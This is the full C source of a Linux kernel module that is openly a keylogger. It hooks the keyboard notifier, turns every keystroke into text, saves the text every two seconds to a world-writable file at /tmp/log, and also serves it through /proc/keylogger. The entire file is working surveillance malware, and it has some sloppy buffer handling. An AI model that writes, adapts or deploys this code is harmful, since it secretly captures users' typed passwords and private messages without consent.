#include <linux/module.h> 
#include <linux/keyboard.h> // For working with the keyboard
#include <linux/kernel.h> 
#include <linux/init.h>
#include <linux/proc_fs.h> 
#include <linux/uaccess.h> // for copying data to user
#include <linux/fs.h>
#include <asm-generic/segment.h> // for file manipulation
#include <linux/buffer_head.h> // for read/write to file
#include <linux/string.h> // to get strlen
#include <linux/timer.h> // for timer 

MODULE_LICENSE("GPL");

#define dump_filename "/tmp/log"
// File where the logged keys are going to be stored.
#define PROC_NAME "keylogger"
#define MAX_SIZE 10000

/* keymap is the mapping of keys that happens when the shift key isn't pressed 
 * keymapShiftActivated is the mapping of keys when shift is pressed down */
static const char* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
                        "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
                        "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

static const char* keymapShiftActivated[] =
                        { "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "_BACKSPACE_", "_TAB_",
                        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "_ENTER_", "_CTRL_", "A", "S", "D", "F",
                        "G", "H", "J", "K", "L", ":", "\"", "~", "_SHIFT_", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
                        "?", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};
// This variable indicates whether shift has been pressed or not; 0 means no and 1 means it is pressed 
static int shift = 0; 
//Array to store the keystrokes to display it at a later point 
static char saved[MAX_SIZE]; 
// Variable to store the current size of an array 
static int saved_size = 0;
// Declaring a variable of proc_dir_entry structure type to create a proc file 
static struct proc_dir_entry *our_proc_file;
// Declaring a timer list for out timer
static struct timer_list my_timer;
//static int track_size = 0;

struct file * driver_file_open(const char *path, int flags, int mode)
{
        struct file *filp = NULL;
        mm_segment_t oldfs;
        oldfs   = get_fs();
        set_fs(get_ds());
        filp = filp_open(path, O_CREAT|O_RDWR, S_IRWXU|S_IRWXG|S_IRWXO);
        set_fs(oldfs);
        return (filp);
}

void driver_file_close(struct file *filp)
{
        filp_close(filp, NULL);
}

int driver_file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size)
{
        int ret;
        mm_segment_t oldfs;
        loff_t  pos = offset;
        oldfs   = get_fs();
        set_fs(get_ds());

        //vfs_setpos(file, pos, pos + PAGE_SIZE);
        //Workaround for vfs_setpos, not implemented on my version of linux.
        spin_lock(&file->f_lock);
        file->f_pos = pos;
        //file->f_version = 0;
        printk(KERN_INFO "set position to  %llx\n", pos);
        spin_unlock(&file->f_lock);


        ret = kernel_write(file, data, size, &pos);
        //vfs_fsync(file, 0);
        set_fs(oldfs);
        return (ret);
}

int driver_file_read(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size)
{
        int ret;
        mm_segment_t oldfs;
        loff_t  pos = offset;
        oldfs   = get_fs();
        set_fs(get_ds());

        //vfs_setpos(file, pos, pos + PAGE_SIZE);
        //Workaround for vfs_setpos, not implemented on my version of linux.
        spin_lock(&file->f_lock);
        file->f_pos = pos;
        //file->f_version = 0;
        printk(KERN_INFO "set position to read %llx\n", pos);
        spin_unlock(&file->f_lock);

        ret = kernel_read(file, data, size, &pos);
        //vfs_fsync(file, 0);
        set_fs(oldfs);
        return (ret);
}

int write_to_file(char *saved)
{
	struct file *file;
	//printk(KERN_ALERT "IT WORKS");
	file = driver_file_open(dump_filename, O_APPEND|O_CREAT, 0644);
	driver_file_write(file,0,saved,strlen(saved));
	//track_size += strlen(saved);
	//memset(saved, 0, MAX_SIZE * (sizeof saved[0]) );
	//saved_size = 0;
	driver_file_close(file);
	return 0;

}

void my_timer_callback(struct timer_list *t)
{
	mod_timer(&my_timer, jiffies + msecs_to_jiffies(2000));
	printk(KERN_INFO "YAY");
	if(strlen(saved) != 0)
		write_to_file(saved);
}

static int Keylogger_func(struct notifier_block *nblock, unsigned long code, void *_param) {
	/* Keylogger_func()
	* ----------------
	*
	* Function arguments are supplied by the kernel and should not be changed
	* 
	* Description :
	* Function for getting the keystrokes and storing them.
	* 
	* struct keyboard_notifier_param {
	*  struct vc_data *vc; VC on which the keyboard press was done
	int down;    Pressure of the key?
	int shift;      Current shift mask 
	int ledstate;        Current led state 
	unsigned int value; keycode, unicode value or keysym 
	};
	* The above struct is used to get the values of the keystrokes 
	*                                                                          */
	struct keyboard_notifier_param *param = _param;
	static int ch, i, j;

	if (code == KBD_KEYCODE) 
	{ 
		//checking whether it is a standard keyboard key
		if (param -> value == 42 || param -> value == 54) 
		{
			//checking if it is shift
			if (param->down) 
			{ 
				shift = 1;  //shift is pressed 
			} else {
				shift = 0;
			} 
			return NOTIFY_OK;
		}
		if (param->down) 
		{ 
			if(shift == 0) 
			{ 
				//shift isn't pressed
				//printk(KERN_ALERT "%s \n", keymap[param->value]);
				ch = param->value;
				for (i = 0; keymap[ch][i] != '\0'; ++i);
				if (saved_size + i < MAX_SIZE) 
				{ //checking if the array is overfilled
					for (j = 0; keymap[ch][j] != '\0'; ++j) {
						saved[saved_size + j] = keymap[ch][j]; //concating the strings
					}
					saved_size += i; //increasing the size counter
				} else {
					saved_size = 0;
				}
			} else {
				ch = param->value;
				for (i = 0; keymapShiftActivated[ch][i] != '\0'; ++i);
				if (saved_size + i < MAX_SIZE) 
				{ //checking if array is overfilled 
					for (j = 0; keymapShiftActivated[ch][j] != '\0'; ++j) {
						saved[saved_size + j] = keymapShiftActivated[ch][j]; //concating strings 
					}
				saved_size += i; //increasing the size counter 
				} else {
					saved_size = 0;
				}
				//printk(KERN_ALERT "%s \n", keymapShiftActivated[param->value]);
			}

		}
	}
	return NOTIFY_OK; //return OK 
} 

static ssize_t procfile_read(struct file *file, char *buffer, size_t length, loff_t *offset) {
	/*
	* procfile_read()
	* --------------
	*  
	* standard kernel function for reading from a proc file
	* This function copies the enitre saved keystorkes to the userspace 
	* 
	*                                                                      */
	static int finished = 0;
	if (finished) 
	{
		printk(KERN_ALERT "Fully read");
		finished = 0;
		return 0;
	}
	finished = 1;
	if (copy_to_user(buffer, saved, saved_size)) 
	{
		printk(KERN_ALERT "Nothing saved in the file");
		return -EFAULT;
	}
	return saved_size;
}

static ssize_t procfile_write(struct file *file, const char *buffer, size_t count, loff_t *offset) {
	/* 
	* procfile_write()
	* ---------------
	*  
	* Doesn't do anything much :P
	*                                  */
	printk(KERN_ALERT "That's just great");
	return 0;
} 

static struct notifier_block key_logger = {
	.notifier_call = Keylogger_func
}; 

static struct file_operations fops_struct = {
	.read = procfile_read,
	.write = procfile_write,
}; 

int init_module() {
	timer_setup(&my_timer, my_timer_callback, 0);
	mod_timer(&my_timer, jiffies + msecs_to_jiffies(2000));
	our_proc_file = proc_create(PROC_NAME, 0644, NULL, &fops_struct);
	if (our_proc_file == NULL) 
	{
		remove_proc_entry(PROC_NAME, NULL);
		printk(KERN_ALERT "Error unable to register");
		return -ENOMEM;
	}
	register_keyboard_notifier(&key_logger);
	printk(KERN_ALERT "Keylogger regsistered");
	return 0;
}

void cleanup_module() {
	del_timer(&my_timer);
	remove_proc_entry(PROC_NAME, NULL);
	unregister_keyboard_notifier(&key_logger);
	write_to_file(saved);
	printk(KERN_ALERT "Unregistered");
}
